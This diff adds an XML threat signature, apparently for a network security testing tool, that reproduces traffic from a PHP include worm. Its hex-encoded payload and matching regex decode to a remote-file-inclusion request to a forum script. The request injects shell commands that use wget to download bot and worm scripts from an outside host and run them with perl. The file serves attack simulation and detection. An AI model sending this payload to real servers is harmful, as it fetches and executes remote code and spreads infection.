@@ -1,0 +1,84 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="phpinclude.worm Attack 2"/>
+    <EngDesc display="true" value="This threat attacks a common programming mistake in PHP.  The PHP include worm attacks using a generic form of this attack.  This is a sample of one version of this worm."/>
+    <Intent display="true">
+      <item value="Infection"/>
+    </Intent>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Server"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="PHP"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="PHP"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true"/>
+    <Credit display="true" value="http://www.iwfc.security.org/viewdiary.php?diary=20041226"/>
+    <CVEID display="true" value=""/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="0000010127edbd6b00c000a80001003c4e717bb3"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="none"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632742200731406250"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="H"/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X47\X45\X54\X20\X2F\X66\X6F\X72\X75\X6D\X2F\X76\X69\X65\X77\X74\X6F\X70\X69\X63\X2E\X70\X68\X70\X3F\X70\X3D\X31\X36\X30\X37\X2F\X66\X61\X71\X2E\X70\X68\X70\X3F\X73\X69\X64\X3D\X68\X74\X74\X70\X3A\X2F\X2F\X77\X77\X77\X2E\X76\X69\X73\X75\X61\X6C\X63\X6F\X64\X65\X72\X73\X2E\X6E\X65\X74\X2F\X73\X70\X79\X2E\X67\X69\X66\X3F\X26\X63\X6D\X64\X3D\X63\X64\X25\X32\X30\X2F\X74\X6D\X70\X3B\X77\X67\X65\X74\X25\X32\X30\X77\X77\X77\X2E\X76\X69\X73\X75\X61\X6C\X63\X6F\X64\X65\X72\X73\X2E\X6E\X65\X74\X2F\X73\X70\X79\X62\X6F\X74\X2E\X74\X78\X74\X3B\X77\X67\X65\X74\X25\X32\X30\X77\X77\X77\X2E\X76\X69\X73\X75\X61\X6C\X63\X6F\X64\X65\X72\X73\X2E\X6E\X65\X74\X2F\X77\X6F\X72\X6D\X31\X2E\X74\X78\X74\X3B\X77\X67\X65\X74\X25\X32\X30\X77\X77\X77\X2E\X76\X69\X73\X75\X61\X6C\X63\X6F\X64\X65\X72\X73\X2E\X6E\X65\X74\X2F\X70\X68\X70\X2E\X74\X78\X74\X3B\X77\X67\X65\X74\X25\X32\X30\X77\X77\X77\X2E\X76\X69\X73\X75\X61\X6C\X63\X6F\X64\X65\X72\X73\X2E\X6E\X65\X74\X2F\X6F\X77\X20\X6E\X7A\X2E\X74\X78\X74\X3B\X77\X67\X65\X74\X25\X32\X30\X77\X77\X77\X2E\X76\X69\X73\X75\X61\X6C\X63\X6F\X64\X65\X72\X73\X2E\X6E\X65\X74\X2F\X7A\X6F\X6E\X65\X2E\X74\X78\X74\X3B\X70\X65\X72\X6C\X25\X32\X30\X73\X70\X79\X62\X6F\X74\X2E\X74\X78\X74\X3B\X70\X65\X72\X6C\X25\X32\X30\X77\X6F\X72\X6D\X31\X2E\X74\X78\X74\X3B\X70\X65\X72\X6C\X25\X32\X30\X6F\X77\X6E\X7A\X2E\X74\X78\X74\X3B\X70\X65\X72\X6C\X25\X32\X30\X70\X68\X70\X2E\X74\X78\X74\X20\X48\X54\X54\X50\X2F\X31\X2E\X31\X0D\X0A"/>
+    <Created value="1139462389" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="D"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="F"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.DefaultDataType" value="null" index="G"/>
+  </Variables>
+  <Loops>
+    <for index="H">
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+      <for index="G"/>
+    </for>
+  </Loops>
+  <Output index="H" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026, 65535)" destPort="$HTTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="474554202F666F72756D2F76696577746F7069632E7068703F703D313630372F6661712E7068703F7369643D687474703A2F2F7777772E76697375616C636F646572732E6E65742F7370792E6769663F26636D643D63642532302F746D703B776765742532307777772E76697375616C636F646572732E6E65742F737079626F742E7478743B776765742532307777772E76697375616C636F646572732E6E65742F776F726D312E7478743B776765742532307777772E76697375616C636F646572732E6E65742F7068702E7478743B776765742532307777772E76697375616C636F646572732E6E65742F6F77206E7A2E7478743B776765742532307777772E76697375616C636F646572732E6E65742F7A6F6E652E7478743B7065726C253230737079626F742E7478743B7065726C253230776F726D312E7478743B7065726C2532306F776E7A2E7478743B7065726C2532307068702E74787420485454502F312E310D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="" destMac="" pktType="">
+        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="485454502f312e3120323030204f4b0d0a5365727665723a204170616368650d0a4c6173742d4d6f6469666965643a204d6f6e2c2030322046656220323030342031313a33323a343120474d540d0a455461673a202261396436652d3830302d33643235636631383534383430220d0a4163636570742d52616e6765733a2062797465730d0a436f6e74656e742d4c656e6774683a20350d0a4b6565702d416c6976653a2074696d656f75743d31352c206d61783d3130300d0a436f6e6e656374696f6e3a204b6565702d416c6976650d0a436f6e74656e742d547970653a20746578742f706c61696e0d0a0d0a50776e5421" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
